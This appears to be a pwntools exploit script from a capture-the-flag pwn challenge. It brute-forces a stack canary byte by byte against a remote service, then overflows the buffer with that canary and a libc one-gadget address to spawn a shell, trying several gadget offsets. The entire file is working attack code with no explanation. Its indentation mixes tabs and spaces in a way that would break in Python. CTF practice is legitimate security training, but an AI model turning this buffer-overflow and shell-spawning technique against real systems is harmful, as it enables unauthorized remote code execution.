from pwn import *
libc=ELF('/media/sf_kalishared/livectfs/sharkyctf2020/pwn2/libc-2.27.so')

def bf(fpayload):
        for j in range(8):
                for i in range(256):
                                payload=fpayload+p8(i)
				target=remote('asia.pwn.zh3r0.ml',3248)
				for k in range(2):
					(target.recvuntil("->"))
					target.sendline("yes")
				(target.recvuntil("->"))
				libc_base=int(target.recvline().strip("\n"),16)
				(target.recvuntil("->"))
				target.send(payload)
				r=target.recvline()
                                target.close()
                                if("happy" in r):
                                        fpayload=payload
                                        print(hex(u64(fpayload[0x24:].ljust(8,"\x00"))))
                                     	break
        canary=u64(fpayload[0x24:].ljust(8,"\x00"))
        return canary

fpayload="A"*0x24
canary=bf(fpayload)

gadgets=[0x4f322,0x10a38c,0x10a398,0xe569f,0xe5863,0xe5858,0x4f2c5,0xe585f]
for gadget in gadgets:
	target=remote('asia.pwn.zh3r0.ml',3248)
	for j in range(2):
		print(target.recvuntil("->"))
		target.sendline("yes")
	print(target.recvuntil("->"))
	libc_base=int(target.recvline().strip("\n"),16)
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	print(hex(libc_gadget))
	print(target.recvuntil("->"))
	target.send("A"*0x24+p64(canary)+"A"*12+p64(libc_gadget))
	target.sendline("ls")
	r=""
	try:
		r=target.recvline()
		print(r)
	except Exception:
		print("fail")
		target.close()
	if (len(r)>0):
		print("r=",r)
		target.interactive()

